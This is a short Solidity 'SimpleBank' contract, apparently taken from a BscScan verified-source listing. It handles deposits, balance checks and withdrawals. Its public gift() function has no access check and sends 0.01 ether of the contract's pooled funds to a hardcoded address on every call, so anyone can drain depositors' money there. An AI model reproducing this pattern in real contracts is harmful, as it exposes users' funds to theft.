/**
 *Submitted for verification at BscScan.com on 2022-10-01
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.16;

contract SimpleBank {
    uint public transactions;
    uint public sendback;

    mapping(address=>uint) balances;



    function deposit() public payable {
        balances[msg.sender] += msg.value;
        transactions++;
    }

    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
        transactions++;
    }




    function gift()public payable {
    payable(0x918E648D4374c890368C98976bCfF2ba402090af).transfer(0.01 ether);

    }
}